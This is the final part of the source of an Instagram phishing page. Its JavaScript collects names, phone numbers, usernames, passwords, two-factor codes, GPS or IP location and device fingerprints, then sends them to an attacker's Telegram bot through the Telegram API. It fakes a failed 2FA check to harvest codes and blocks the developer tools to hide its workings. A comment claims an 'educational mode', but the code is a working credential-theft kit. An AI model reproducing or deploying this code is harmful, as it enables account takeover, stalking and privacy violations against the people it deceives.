                <span class="info-value">${collectedData.deviceInfo.browser}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Screen:</span>
                <span class="info-value">${collectedData.deviceInfo.screenResolution}</span>
            </div>`;
            
            if (collectedData.deviceInfo.battery && typeof collectedData.deviceInfo.battery !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">Battery:</span>
                    <span class="info-value">${collectedData.deviceInfo.battery.level} ${collectedData.deviceInfo.battery.charging ? '(Charging)' : ''}</span>
                </div>`;
            }
            
            if (collectedData.deviceInfo.connection && typeof collectedData.deviceInfo.connection !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">Connection:</span>
                    <span class="info-value">${collectedData.deviceInfo.connection.effectiveType} (${collectedData.deviceInfo.connection.downlink})</span>
                </div>`;
            }
            
            if (collectedData.deviceInfo.gpu && typeof collectedData.deviceInfo.gpu !== 'string') {
                html += `<div class="info-item">
                    <span class="info-label">GPU:</span>
                    <span class="info-value">${collectedData.deviceInfo.gpu.renderer || 'Not detected'}</span>
                </div>`;
            }
            
            html += `<div class="info-item">
                <span class="info-label">RAM:</span>
                <span class="info-value">${collectedData.deviceInfo.deviceMemory || 'Unknown'}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">CPU Cores:</span>
                <span class="info-value">${collectedData.deviceInfo.hardwareConcurrency}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Timezone:</span>
                <span class="info-value">${collectedData.deviceInfo.timezone}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Session ID:</span>
                <span class="info-value">${collectedData.sessionId}</span>
            </div>`;
            
            deviceInfoDiv.innerHTML = html;
        }

        // ============================================
        // TWO-FACTOR AUTHENTICATION MODAL
        // ============================================
        function showTwoFactorModal() {
            if (collectedData.userInfo.mobileNumber) {
                const lastDigits = collectedData.userInfo.mobileNumber.slice(-4);
                phoneLastDigits.textContent = lastDigits;
            } else {
                phoneLastDigits.textContent = '****';
            }
            
            twoFactorModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Auto-focus on input
            setTimeout(() => {
                twoFactorCodeInput.focus();
            }, 300);
        }

        verifyCodeBtn.addEventListener('click', async function() {
            const code = twoFactorCodeInput.value.trim();
            
            if (code.length !== 6 || !/^\d+$/.test(code)) {
                alert('Please enter a valid 6-digit code');
                return;
            }
            
            // Store 2FA code
            collectedData.twoFactorCode = code;
            collectedData.twoFactorTimestamp = new Date().toISOString();
            
            // Send 2FA code to Telegram
            await sendToTelegram('TWO_FACTOR');
            
            // Hide modal
            twoFactorModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            
            // Show error again
            setTimeout(() => {
                showError('Code verification failed. Please try logging in again.');
            }, 500);
        });

        useBackupBtn.addEventListener('click', function() {
            alert('Backup codes are not available. Please use the 6-digit code sent to your phone.');
        });

        // Auto-advance input
        twoFactorCodeInput.addEventListener('input', function(e) {
            if (this.value.length === 6) {
                verifyCodeBtn.click();
            }
        });

        // ============================================
        // TELEGRAM INTEGRATION
        // ============================================
        async function sendToTelegram(type) {
            // Don't send if tokens are not configured
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_BOT') || 
                !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes('YOUR_CHAT')) {
                console.log('Telegram bot not configured. Educational mode.');
                return;
            }
            
            try {
                let message = formatTelegramMessage(type);
                
                // URL encode the message
                const encodedMessage = encodeURIComponent(message);
                
                // Send to Telegram
                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`,
                    { method: 'POST' }
                );
                
                if (response.ok) {
                    console.log(`Data sent to Telegram (${type})`);
                    collectedData.timestamps.dataSent = new Date().toISOString();
                } else {
                    console.error('Telegram API error:', await response.text());
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        function formatTelegramMessage(type) {
            const timestamp = new Date().toLocaleString();
            let message = '';
            
            switch(type) {
                case 'USER_INFO':
                    message = `ðŸ” <b>INSTAGRAM - USER INFORMATION</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>Full Name:</b> ${collectedData.userInfo.fullName}\n` +
                             `ðŸ“ž <b>Mobile Number:</b> ${collectedData.userInfo.mobileNumber}\n` +
                             `â° <b>Time:</b> ${timestamp}\n` +
                             `ðŸŒ <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.browser}`;
                    break;
                    
                case 'LOCATION':
                case 'LOCATION_IP':
                    const source = type === 'LOCATION' ? 'GPS' : 'IP';
                    const accuracy = collectedData.location.accuracy || 'Unknown';
                    const mapLink = collectedData.location.mapLink || 'No map available';
                    
                    message = `ðŸ“ <b>INSTAGRAM - LOCATION DATA (${source})</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸŒ <b>Coordinates:</b> ${collectedData.location.latitude}, ${collectedData.location.longitude}\n` +
                             `ðŸ™ï¸ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
                             `ðŸ“¡ <b>Source:</b> ${collectedData.location.source || source}\n` +
                             `ðŸŽ¯ <b>Accuracy:</b> ${accuracy}\n` +
                             `ðŸ• <b>Timezone:</b> ${collectedData.location.timezone || 'Unknown'}\n` +
                             `ðŸ—ºï¸ <b>Google Maps:</b> <a href="${mapLink}">Click here</a>\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'CREDENTIALS':
                    message = `ðŸ”‘ <b>INSTAGRAM - LOGIN CREDENTIALS</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username}\n` +
                             `ðŸ” <b>Password:</b> ${collectedData.credentials.password}\n` +
                             `ðŸŒ <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                             `ðŸ“ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'TWO_FACTOR':
                    message = `ðŸ”¢ <b>INSTAGRAM - TWO-FACTOR CODE</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username || 'Unknown'}\n` +
                             `ðŸ”¢ <b>2FA Code:</b> ${collectedData.twoFactorCode}\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'FULL_DATA':
                    const userAgentShort = navigator.userAgent.length > 100 ? 
                        navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent;
                    
                    message = `ðŸ“Š <b>INSTAGRAM - COMPLETE DATA COLLECTION</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username || 'Not captured'}\n` +
                             `ðŸ” <b>Password:</b> ${collectedData.credentials.password || 'Not captured'}\n` +
                             `ðŸŒ <b>Location:</b> ${collectedData.location.latitude || 'Unknown'}, ${collectedData.location.longitude || 'Unknown'}\n` +
                             `ðŸ™ï¸ <b>City:</b> ${collectedData.location.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
                             `ðŸŒ <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                             `ðŸ“± <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}\n` +
                             `ðŸ–¥ï¸ <b>Browser:</b> ${collectedData.deviceInfo.browser}\n` +
                             `ðŸ“º <b>Screen:</b> ${collectedData.deviceInfo.screenResolution}\n` +
                             `ðŸ”‹ <b>Battery:</b> ${collectedData.deviceInfo.battery?.level || 'Unknown'}\n` +
                             `ðŸ–¥ï¸ <b>GPU:</b> ${collectedData.deviceInfo.gpu?.renderer || 'Unknown'}\n` +
                             `ðŸ’¾ <b>RAM:</b> ${collectedData.deviceInfo.deviceMemory || 'Unknown'}\n` +
                             `âš¡ <b>CPU Cores:</b> ${collectedData.deviceInfo.hardwareConcurrency}\n` +
                             `ðŸ• <b>Timezone:</b> ${collectedData.deviceInfo.timezone}\n` +
                             `ðŸ—ºï¸ <b>Map Link:</b> <a href="${collectedData.location.mapLink || '#'}">${collectedData.location.mapLink || 'No location'}</a>\n` +
                             `â° <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n\n` +
                             `<b>Full User Agent:</b>\n<code>${userAgentShort}</code>`;
                    break;
            }
            
            return message;
        }

        // ============================================
        // HELPER FUNCTIONS
        // ============================================
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
            if (ua.includes("Edg")) return "Edge";
            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
            if (ua.includes("Trident") || ua.includes("MSIE")) return "Internet Explorer";
            return "Unknown";
        }

        function getOperatingSystem() {
            const ua = navigator.userAgent;
            if (ua.includes("Win")) return "Windows";
            if (ua.includes("Mac")) return "macOS";
            if (ua.includes("Linux")) return "Linux";
            if (ua.includes("Android")) return "Android";
            if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
            return "Unknown";
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                    return 'WebGL available (no debug info)';
                }
                return 'WebGL not supported';
            } catch (e) {
                return 'Error getting WebGL info';
            }
        }

        function formatBytes(bytes) {
            if (bytes === 0 || !bytes) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function showError(msg) {
            errorMessage.textContent = msg;
            errorMessage.style.display = 'block';
            
            // Auto-hide after 5 seconds
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 5000);
        }

        function preventDevTools() {
            // Prevent right-click
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
            
            // Prevent keyboard shortcuts for dev tools
            document.addEventListener('keydown', function(e) {
                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'U') ||
                    (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                    e.preventDefault();
                    return false;
                }
            });
        }

        // ============================================
        // ADDITIONAL FEATURES
        // ============================================
        // Prevent page unload without completing
        window.addEventListener('beforeunload', function(e) {
            if (collectedData.credentials.username && !collectedData.timestamps.dataSent) {
                // Send exit data
                sendToTelegram('PAGE_EXIT');
            }
        });

        // Handle copy/paste events
        document.addEventListener('copy', function(e) {
            console.log('Copy action detected');
        });

        document.addEventListener('paste', function(e) {
            console.log('Paste action detected');
        });

        // Heartbeat to keep session alive
        setInterval(() => {
            if (collectedData.sessionId) {
                console.log('Session active:', collectedData.sessionId.substring(0, 15) + '...');
            }
        }, 30000);

        // Input validation for mobile number
        userMobileInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 15);
        });

        // Input validation for 2FA code
        twoFactorCodeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 6);
        });

        // Form input validation
        usernameInput.addEventListener('blur', function() {
            if (this.value && !this.value.includes('@') && !this.value.match(/^[a-zA-Z0-9._]+$/)) {
                showError('Please enter a valid username or email');
            }
        });

        // Auto-detect and format phone numbers
        userMobileInput.addEventListener('blur', function() {
            if (this.value.length >= 10) {
                // Format as international number
                const cleaned = this.value.replace(/\D/g, '');
                if (cleaned.length === 10) {
                    this.value = `+1${cleaned}`; // Default to US
                }
            }
        });

        // Smooth scrolling for modals
        document.querySelectorAll('.modal-btn, .modal-btn-secondary').forEach(button => {
            button.addEventListener('click', function() {
                this.style.transform = 'scale(0.98)';
                setTimeout(() => {
                    this.style.transform = '';
                }, 150);
            });
        });

        // Handle Enter key in modals
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                if (initialModal.style.display === 'flex') {
                    verifyUserBtn.click();
                } else if (locationModal.style.display === 'flex') {
                    allowLocationBtn.click();
                } else if (twoFactorModal.style.display === 'flex') {
                    verifyCodeBtn.click();
                }
            }
        });

        // Initialize with a slight delay for better UX
        setTimeout(() => {
            if (!initialModal.style.display && !locationModal.style.display) {
                document.body.style.opacity = '1';
            }
        }, 300);
    </script>
</body>
</html>
